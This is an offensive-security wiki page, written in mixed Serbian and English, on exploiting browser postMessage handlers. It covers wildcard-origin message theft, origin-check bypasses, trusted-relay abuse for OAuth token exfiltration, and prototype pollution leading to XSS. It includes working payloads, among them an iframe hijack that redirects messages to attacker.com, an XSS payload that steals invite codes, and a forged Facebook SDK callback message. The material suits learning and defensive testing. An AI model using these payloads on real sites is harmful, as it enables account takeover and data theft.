# PostMessage Ranjivosti

{{#include ../../banners/hacktricks-training.md}}

## Slanje **PostMessage**

**PostMessage** koristi sledeću funkciju za slanje poruke:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Imajte na umu da **targetOrigin** može biti '\*' ili URL kao _https://company.com._\
U **drugom scenariju**, **poruka se može poslati samo toj domeni** (čak i ako je origin of the Window object drugačiji).\
Ako se koristi **wildcard**, **poruke mogu biti poslane bilo kojoj domeni**, i biće poslane na origin of the Window object.

### Napad na iframe & wildcard u **targetOrigin**

Kao što je objašnjeno u [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ako pronađete stranicu koja se može **iframed** (nema `X-Frame-Header` zaštite) i koja **šalje osetljivu** poruku preko **postMessage** koristeći **wildcard** (\*), možete **modifikovati** **origin** **iframe**-a i **leak** osetljivu poruku na domen koji kontrolišete.\
Napomena da ako se stranica može iframed ali je **targetOrigin** **postavljen na URL a ne na wildcard**, ovaj **trik neće raditi**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** je funkcija koju JS koristi da deklariše funkciju koja **očekuje `postMessages`**.\
Koristiće se kod sličan sledećem:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Open the victim page in a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener` exists).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields you want injected (message type, tokens, nonces).
- Because the message now comes **from the trusted origin**, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Hunting tips: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Možete naterati **`e.source`** poruke da bude null kreiranjem **iframe** koji **šalje** **postMessage** i koji je **odmah obrisan**.

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Da biste izveli ove napade idealno bi bilo da možete **postaviti stranicu žrtve** unutar `iframe`. Ali neki headeri kao `X-Frame-Header` mogu **sprečiti** to **ponašanje**.\
U tim scenarijima i dalje možete koristiti manje prikriven napad. Možete otvoriti novu karticu sa ranjivom web aplikacijom i komunicirati sa njom:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Krađa poruke poslate child iframe-om blokiranjem glavne stranice

U sledećoj strani možete videti kako možete ukrasti **osetljivi postmessage podaci** poslati ka **child iframe** tako što ćete **blokirati** **glavnu** stranicu pre slanja podataka i iskoristiti **XSS u child-u** da **leak the data** pre nego što budu primljeni:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Krađa poruke promenom location-a iframe-a

Ako možete ubaciti web stranicu u iframe bez X-Frame-Header koja sadrži drugi iframe, možete **promeniti location tog child iframe-a**, pa ako on prima **postmessage** poslat koristeći **wildcard**, napadač bi mogao **promeniti** origin tog iframe-a na stranicu kojom on **kontroliše** i **ukrasti** poruku:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage prema Prototype Pollution i/ili XSS

U scenarijima gde su podaci poslati putem `postMessage` izvršavani od strane JS-a, možete **iframe** stranicu i **exploit**-ovati **prototype pollution/XSS** slanjem exploita putem `postMessage`.

Nekoliko **veoma dobro objašnjenih XSS-a kroz `postMessage`** može se naći na [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Primer exploita za zloupotrebu **Prototype Pollution i zatim XSS** kroz `postMessage` ka `iframe`-u:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Za **više informacija**:

- Link ka stranici o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link ka stranici o [**XSS**](../xss-cross-site-scripting/index.html)
- Link ka stranici o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predviđanje **`Math.random()`** callback tokena u postMessage bridge-ovima

Kada validacija poruka koristi „shared secret“ generisan sa `Math.random()` (npr. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) i isti helper takođe imenuje plugin iframe-ove, možete povratiti PRNG vrednosti i falsifikovati trusted poruke:

- **Leak PRNG outputs via `window.name`:** SDK automatski imenuje plugin iframe-ove sa `guid()`. Ako kontrolišete top frame, učinite žrtvinu stranicu iframe-om, zatim navigirajte plugin iframe na vaš origin (npr. `window.frames[0].frames[0].location='https://attacker.com'`) i pročitajte `window.frames[0].frames[0].name` da biste dobili raw `Math.random()` output.
- **Force more outputs without reloads:** Neki SDK-ovi izlažu reinit put; u FB SDK-u, slanje `init:post` sa `{xfbml:1}` forsira `XFBML.parse()`, uništava/ponovo kreira plugin iframe i generiše nova imena/callback ID-e. Ponavljani reinit proizvodi onoliko PRNG izlaza koliko je potrebno (napomena: postoje dodatni interni `Math.random()` pozivi za callback/iframe ID-e, pa solveri moraju preskočiti posredne vrednosti).
- **Trusted-origin delivery via parameter pollution:** Ako first-party plugin endpoint reflektuje nesanitizovan parametar u cross-window payload (npr. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), možete injektovati `&type=...&iconSVG=...` dok čuvate trusted `facebook.com` origin.
- **Predict the next callback:** Konvertujte leaked iframe imena nazad u float vrednosti u `[0,1)` i ubacite nekoliko vrednosti (čak i neredom) u V8 `Math.random` predictor (npr. zasnovan na Z3). Generišite sledeći `guid()` lokalno da falsifikujete očekivani callback token.
- **Trigger the sink:** Sastavite postMessage podatke tako da bridge dispatchuje `xd.mpn.setupIconIframe` i injektuje HTML u `iconSVG` (npr. URL-encoded `<img src=x onerror=...>`), ostvarujući DOM XSS unutar hosting origina; odatle se mogu pročitati istog-origina iframe-ovi (OAuth dialogs, arbiters, itd.).
- **Framing quirks help:** Lanac zahteva framing. U nekim mobile webview-ovima, `X-Frame-Options` može degradirati na nepodržani `ALLOW-FROM` kada je prisutan `frame-ancestors`, i “compat” parametri mogu forsirati permisivni `frame-ancestors`, omogućavajući `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Reference

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Za vežbu: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
